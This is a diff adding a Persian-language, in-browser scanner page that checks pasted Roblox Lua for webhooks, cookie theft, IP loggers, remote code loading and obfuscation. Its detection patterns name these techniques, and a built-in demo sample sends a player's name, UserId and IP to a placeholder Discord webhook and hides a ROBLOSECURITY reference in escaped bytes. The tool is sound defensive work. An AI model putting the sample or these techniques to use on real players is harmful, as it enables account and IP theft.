@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Artin security script</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;600;800&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#eef1f6;--surface:#ffffff;--ink:#14213d;--muted:#5b6784;--line:#d3d9e6;
+  --accent:#2f3fb8;--accent-ink:#ffffff;--code-bg:#f5f7fb;
+  --crit:#c4162a;--crit-bg:#fdeceb;--high:#c2410c;--high-bg:#fff0e6;
+  --med:#a16207;--med-bg:#fff7db;--low:#475a7a;--low-bg:#e8edf6;--ok:#1b7a4b;--ok-bg:#e5f6ec;
+  box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+}
+@media (prefers-color-scheme:dark){
+  :root:not([data-theme="light"]){
+    --bg:#0f1524;--surface:#18203a;--ink:#e6ebf7;--muted:#9aa6c4;--line:#2b3556;
+    --accent:#7d8cff;--accent-ink:#0f1524;--code-bg:#111830;
+    --crit:#ff6b78;--crit-bg:#3a1a26;--high:#ff9a5c;--high-bg:#3a2417;
+    --med:#e8c15a;--med-bg:#37300f;--low:#a9b6d6;--low-bg:#222c4a;--ok:#5fd394;--ok-bg:#14301f;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#0f1524;--surface:#18203a;--ink:#e6ebf7;--muted:#9aa6c4;--line:#2b3556;
+  --accent:#7d8cff;--accent-ink:#0f1524;--code-bg:#111830;
+  --crit:#ff6b78;--crit-bg:#3a1a26;--high:#ff9a5c;--high-bg:#3a2417;
+  --med:#e8c15a;--med-bg:#37300f;--low:#a9b6d6;--low-bg:#222c4a;--ok:#5fd394;--ok-bg:#14301f;
+}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:"Vazirmatn",Tahoma,"Segoe UI",sans-serif;line-height:1.8;font-size:16px}
+.wrap{max-width:860px;margin:0 auto;padding:28px 18px 60px}
+header{padding:12px 0 22px;border-bottom:2px solid var(--ink);margin-bottom:24px}
+h1{margin:0;font-size:clamp(28px,6vw,44px);font-weight:800;letter-spacing:-.5px;direction:ltr;text-align:right;line-height:1.2}
+header p{margin:8px 0 0;color:var(--muted);max-width:60ch}
+.panel{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:16px}
+label.t{display:block;font-weight:600;margin-bottom:8px}
+textarea{width:100%;min-height:260px;resize:vertical;direction:ltr;text-align:left;font:13.5px/1.6 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;background:var(--code-bg);color:var(--ink);border:1px solid var(--line);border-radius:8px;padding:12px;tab-size:2}
+textarea:focus,button:focus-visible,.file:focus-within{outline:3px solid var(--accent);outline-offset:2px}
+.row{display:flex;flex-wrap:wrap;gap:10px;align-items:center;margin-top:12px}
+button,.file{font:inherit;font-weight:600;border-radius:8px;padding:9px 16px;cursor:pointer;border:1px solid var(--line);background:var(--surface);color:var(--ink)}
+button.primary{background:var(--accent);color:var(--accent-ink);border-color:var(--accent);font-size:17px;padding:10px 26px}
+button:hover,.file:hover{filter:brightness(.96)}
+.file input{display:none}
+.meta{margin-inline-start:auto;color:var(--muted);font-size:14px}
+#result{margin-top:26px}
+.verdict{display:flex;gap:18px;align-items:center;border:3px double currentColor;border-radius:12px;padding:18px 20px;background:var(--surface)}
+.verdict .icon{font-size:48px;line-height:1}
+.verdict h2{margin:0;font-size:26px;font-weight:800}
+.verdict p{margin:2px 0 0;color:var(--ink)}
+.v-bad{color:var(--crit);background:var(--crit-bg)}.v-warn{color:var(--med);background:var(--med-bg)}.v-ok{color:var(--ok);background:var(--ok-bg)}
+.verdict p{color:var(--ink)}
+.counts{display:flex;flex-wrap:wrap;gap:8px;margin:14px 0}
+.chip{border-radius:999px;padding:3px 14px;font-size:14px;font-weight:600}
+.c-critical{background:var(--crit-bg);color:var(--crit)}.c-high{background:var(--high-bg);color:var(--high)}
+.c-medium{background:var(--med-bg);color:var(--med)}.c-low{background:var(--low-bg);color:var(--low)}
+h3{font-size:18px;margin:26px 0 10px}
+.f{background:var(--surface);border:1px solid var(--line);border-inline-start:6px solid var(--low);border-radius:8px;padding:12px 14px;margin-bottom:10px}
+.f.critical{border-inline-start-color:var(--crit)}.f.high{border-inline-start-color:var(--high)}.f.medium{border-inline-start-color:var(--med)}
+.f .top{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+.f b{font-weight:600}
+.ln{color:var(--muted);font-size:13px;margin-inline-start:auto}
+.hid{background:var(--crit);color:#fff;border-radius:4px;padding:0 8px;font-size:12px}
+.f p{margin:4px 0 8px;color:var(--muted);font-size:14.5px}
+pre{margin:0;direction:ltr;text-align:left;background:var(--code-bg);border-radius:6px;padding:8px 10px;overflow-x:auto;font:12.5px/1.5 ui-monospace,Menlo,Consolas,monospace;white-space:pre-wrap;word-break:break-all}
+.urls{list-style:none;padding:0;margin:0}
+.urls li{direction:ltr;text-align:left;font:13px/1.5 ui-monospace,Menlo,Consolas,monospace;background:var(--surface);border:1px solid var(--line);border-radius:6px;padding:6px 10px;margin-bottom:6px;word-break:break-all}
+.urls li.bad{border-color:var(--crit);color:var(--crit)}
+.note{color:var(--muted);font-size:14px;margin-top:22px}
+.empty{color:var(--muted)}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <h1>Artin security script</h1>
+    <p>کد Lua را اینجا بچسبانید. اسکنر دنبال وب‌هوک، دزدی کوکی، لاگ آیپی، دانلود و اجرای کد از اینترنت و کدهای مبهم‌شده می‌گردد.</p>
+  </header>
+
+  <section class="panel">
+    <label class="t" for="code">کد Lua</label>
+    <textarea id="code" spellcheck="false" placeholder="-- کد Lua را اینجا بچسبانید"></textarea>
+    <div class="row">
+      <button class="primary" id="scan" type="button">اسکن کن</button>
+      <label class="file" tabindex="0">انتخاب فایل<input type="file" id="file" accept=".lua,.txt,.luau"></label>
+      <button type="button" id="sample">نمونه مخرب</button>
+      <button type="button" id="clear">پاک کردن</button>
+      <span class="meta" id="meta">۰ خط</span>
+    </div>
+  </section>
+
+  <section id="result" aria-live="polite"></section>
+  <p class="note">اسکن کاملاً داخل مرورگر شما انجام می‌شود و کد جایی ارسال نمی‌شود. این ابزار الگوها را بررسی می‌کند و جایگزین بررسی دستی نیست؛ «امن» یعنی چیزی پیدا نشد، نه تضمین کامل.</p>
+</div>
+
+<script>
+const $ = id => document.getElementById(id);
+const esc = s => String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const fa = n => String(n).replace(/\d/g, d => '۰۱۲۳۴۵۶۷۸۹'[d]);
+
+const R = [
+ {id:'webhook',sev:'critical',t:'وب‌هوک دیسکورد',d:'داده‌ها به یک وب‌هوک ارسال می‌شود؛ رایج‌ترین روش دزدی آیپی، کوکی و اطلاعات حساب.',re:/discord(app)?\.com\/api\/(v\d+\/)?webhooks|webhook\.lewisakura|webhooks?\.(?:hyra|proxy)|\bwebhook[s]?\s*=/i},
+ {id:'tg',sev:'critical',t:'ارسال به ربات تلگرام',d:'ارتباط با API ربات تلگرام؛ اغلب برای ارسال اطلاعات دزدیده‌شده استفاده می‌شود.',re:/api\.telegram\.org\/bot/i},
+ {id:'cookie',sev:'critical',t:'دسترسی به کوکی یا توکن حساب',d:'اشاره به کوکی ROBLOSECURITY یا گرفتن کوکی؛ یعنی دزدی حساب.',re:/ROBLOSECURITY|DO-NOT-SHARE-THIS|get_?cookie|GetCookies?\b|document\.cookie|\.RBXTOKEN/i},
+ {id:'iplogger',sev:'critical',t:'سرویس لاگ آیپی',d:'آدرس شناخته‌شده‌ی لاگر آیپی پیدا شد.',re:/iplogger|grabify|ipgrabber|2no\.co|yip\.su|blasze|leancoding|stopify|ps3cfw\.com|lovebird\.guru/i},
+ {id:'remoteexec',sev:'critical',t:'اجرای کد دانلودشده از اینترنت',d:'کد از یک آدرس خارجی گرفته و اجرا می‌شود؛ نویسنده هر زمان می‌تواند کد را عوض کند.',re:/loadstring\s*\(\s*(game\s*:\s*)?(HttpGet|HttpGetAsync)|loadstring\s*\(\s*[\w.:]*(Http|request|GetAsync)/i},
+ {id:'ipget',sev:'high',t:'گرفتن آیپی',d:'درخواست به سرویس نمایش آیپی؛ برای لو دادن آیپی قربانی استفاده می‌شود.',re:/ipify\.org|ip-api\.com|ipinfo\.io|icanhazip|ifconfig\.me|checkip\.amazonaws|ipapi\.co|myexternalip|wtfismyip|ipecho|api\.my-ip|ident\.me/i},
+ {id:'backdoor',sev:'high',t:'require با شناسه عددی (احتمال بک‌دور)',d:'ماژولی با شناسه عددی از بیرون لود می‌شود و می‌تواند هر کدی اجرا کند.',re:/\brequire\s*\(\s*\d{6,}\s*\)/},
+ {id:'asset',sev:'high',t:'لود دارایی خارجی',d:'InsertService/LoadAsset می‌تواند کد یا مدل دلخواه را داخل بازی بیاورد.',re:/LoadAsset(Version)?\s*\(|InsertService/i},
+ {id:'os',sev:'high',t:'دسترسی به سیستم‌عامل یا فایل',d:'اجرای دستور یا کار با فایل‌های سیستم.',re:/\b(os\.execute|io\.popen|os\.remove|os\.rename|io\.open|package\.loadlib)\b/},
+ {id:'loadstring',sev:'medium',t:'استفاده از loadstring',d:'اجرای متن به‌عنوان کد؛ در کدهای مخرب برای مخفی کردن رفتار زیاد دیده می‌شود.',re:/\bloadstring\b|\bload\s*\(\s*["'\w]/},
+ {id:'http',sev:'medium',t:'ارسال درخواست HTTP',d:'اسکریپت به اینترنت درخواست می‌فرستد؛ مقصد را بررسی کنید.',re:/HttpService\s*[:.]\s*(PostAsync|RequestAsync|GetAsync)|\b(syn|http|fluxus|krnl)\.request\b|\bhttp_request\b|(^|[^\w.:])request\s*\(\s*\{|game\s*:\s*HttpGet/i},
+ {id:'env',sev:'medium',t:'getfenv / setfenv',d:'دستکاری محیط اجرا؛ برای مخفی کردن فراخوانی‌ها استفاده می‌شود.',re:/\b(getfenv|setfenv|getrawmetatable|hookfunction|hookmetamethod)\b/},
+ {id:'esc',sev:'medium',t:'رشته‌های رمزگذاری‌شده',d:'دنباله‌ای از کاراکترهای escape یا string.char برای پنهان کردن متن.',re:/(\\\d{2,3}){6,}|(\\x[0-9a-fA-F]{2}){6,}|string\.char\s*\((\s*\d+\s*,){6,}/},
+ {id:'b64',sev:'medium',t:'متن بسیار بلند base64',d:'رشته طولانی رمزگذاری‌شده که ممکن است کد یا آدرس پنهان باشد.',re:/["'][A-Za-z0-9+\/]{80,}={0,2}["']/},
+ {id:'names',sev:'low',t:'نام‌گذاری مبهم‌ساز',d:'نام متغیرها شبیه خروجی ابزارهای obfuscator است.',re:/\b_0x[0-9a-f]{3,}\b|\b[Il1]{8,}\b/},
+ {id:'pinfo',sev:'info',re:/\b(UserId|AccountAge|LocalPlayer|DisplayName|Players\.LocalPlayer)\b/}
+];
+const W = {critical:40,high:20,medium:8,low:2};
+const SEV = {critical:'بحرانی',high:'زیاد',medium:'متوسط',low:'کم'};
+
+function decode(s){
+  let o = s.replace(/string\.char\s*\(([\d\s,]+)\)/g,(m,a)=>'"'+a.split(',').map(n=>String.fromCharCode(+n)).join('')+'"');
+  o = o.replace(/\\(\d{1,3})/g,(m,n)=>+n<256?String.fromCharCode(+n):m);
+  o = o.replace(/\\x([0-9a-fA-F]{2})/g,(m,h)=>String.fromCharCode(parseInt(h,16)));
+  (o.match(/[A-Za-z0-9+\/]{24,}={0,2}/g)||[]).forEach(x=>{
+    try{const d=atob(x); if(/^[\x20-\x7e\s]+$/.test(d)) o+=' '+d;}catch(e){}
+  });
+  return o;
+}
+
+function scan(){
+  const src = $('code').value;
+  const out = $('result');
+  if(!src.trim()){ out.innerHTML = '<p class="empty">اول کدی بچسبانید یا فایلی انتخاب کنید.</p>'; return; }
+  const lines = src.split(/\r?\n/);
+  const found = []; let inBlock = false;
+  lines.forEach((raw,i)=>{
+    const t = raw.trim();
+    if(inBlock){ if(/\]=*\]/.test(t)) inBlock = false; return; }
+    if(/^--\[=*\[/.test(t)){ if(!/\]=*\]/.test(t.replace(/^--\[=*\[/,''))) inBlock = true; return; }
+    if(t.startsWith('--')) return;
+    const dec = decode(raw);
+    const vars = [[raw,false]]; if(dec!==raw) vars.push([dec,true]);
+    R.forEach(r=>{
+      for(const [v,hid] of vars){
+        if(r.re.test(v)){ found.push({id:r.id,sev:r.sev,t:r.t,d:r.d,line:i+1,snip:raw.trim(),hidden:hid}); break; }
+      }
+    });
+  });
+  const http = found.find(f=>f.id==='http'||f.id==='webhook');
+  const pinfo = found.some(f=>f.id==='pinfo');
+  if(http && pinfo) found.push({id:'combo',sev:'high',t:'ارسال اطلاعات بازیکن به بیرون',d:'هم اطلاعات بازیکن خوانده می‌شود و هم درخواست HTTP وجود دارد؛ احتمال لو دادن اطلاعات.',line:http.line,snip:http.snip,hidden:false});
+  const shown = found.filter(f=>f.sev!=='info');
+  const order = {critical:0,high:1,medium:2,low:3};
+  shown.sort((a,b)=>order[a.sev]-order[b.sev]||a.line-b.line);
+
+  let score = shown.reduce((s,f)=>s+W[f.sev]+(f.hidden?10:0),0);
+  const cnt = {critical:0,high:0,medium:0,low:0}; shown.forEach(f=>cnt[f.sev]++);
+  let cls,icon,title,msg;
+  if(cnt.critical>0 || score>=40){cls='v-bad';icon='⛔';title='امن نیست';msg='رفتار مخرب پیدا شد. این کد را اجرا نکنید.';}
+  else if(score>=10){cls='v-warn';icon='⚠️';title='مشکوک';msg='موارد پرریسک وجود دارد. قبل از اجرا آن‌ها را دستی بررسی کنید.';}
+  else {cls='v-ok';icon='✅';title='امن به نظر می‌رسد';msg='الگوی مخربی پیدا نشد. این تضمین کامل نیست.';}
+
+  const urls = new Set();
+  (src+'\n'+decode(src)).split(/\r?\n/).forEach(l=>{ if(l.trim().startsWith('--')) return; (l.match(/https?:\/\/[^\s"'<>)\]]+/gi)||[]).forEach(u=>urls.add(u)); });
+  const badRe = [R[0].re,R[1].re,R[3].re,R[5].re];
+
+  let h = `<div class="verdict ${cls}"><div class="icon">${icon}</div><div><h2>${title}</h2><p>${msg}</p></div></div>`;
+  h += '<div class="counts">'+Object.keys(cnt).filter(k=>cnt[k]).map(k=>`<span class="chip c-${k}">${SEV[k]}: ${fa(cnt[k])}</span>`).join('')+'</div>';
+  if(shown.length){
+    h += '<h3>یافته‌ها</h3>' + shown.map(f=>`<div class="f ${f.sev}"><div class="top"><b>${esc(f.t)}</b><span class="chip c-${f.sev}">${SEV[f.sev]}</span>${f.hidden?'<span class="hid">پنهان با encode</span>':''}<span class="ln">خط ${fa(f.line)}</span></div><p>${esc(f.d)}</p><pre>${esc(f.snip.slice(0,220))}</pre></div>`).join('');
+  } else h += '<p class="empty">هیچ یافته‌ای نیست.</p>';
+  if(urls.size){
+    h += '<h3>آدرس‌های داخل کد</h3><ul class="urls">'+[...urls].map(u=>`<li class="${badRe.some(r=>r.test(u))?'bad':''}">${esc(u)}</li>`).join('')+'</ul>';
+  }
+  out.innerHTML = h;
+  out.scrollIntoView({behavior:'smooth',block:'start'});
+}
+
+function meta(){ const v=$('code').value; $('meta').textContent = fa(v?v.split(/\r?\n/).length:0)+' خط'; }
+$('scan').onclick = scan;
+$('clear').onclick = ()=>{ $('code').value=''; $('result').innerHTML=''; meta(); };
+$('code').addEventListener('input', meta);
+$('file').addEventListener('change', e=>{
+  const f = e.target.files[0]; if(!f) return;
+  const r = new FileReader(); r.onload = ()=>{ $('code').value = r.result; meta(); scan(); }; r.readAsText(f);
+});
+$('sample').onclick = ()=>{
+  $('code').value = `local HttpService = game:GetService("HttpService")
+local plr = game.Players.LocalPlayer
+local hook = "https://discord.com/api/webhooks/123456789/abcdefg"
+local ip = game:HttpGet("https://api.ipify.org")
+local data = {content = plr.Name .. " | " .. plr.UserId .. " | " .. ip}
+HttpService:PostAsync(hook, HttpService:JSONEncode(data))
+local c = "\\46\\82\\79\\66\\76\\79\\83\\69\\67\\85\\82\\73\\84\\89"
+require(7482910365)`;
+  meta(); scan();
+};
+</script>
+</body>
+</html>
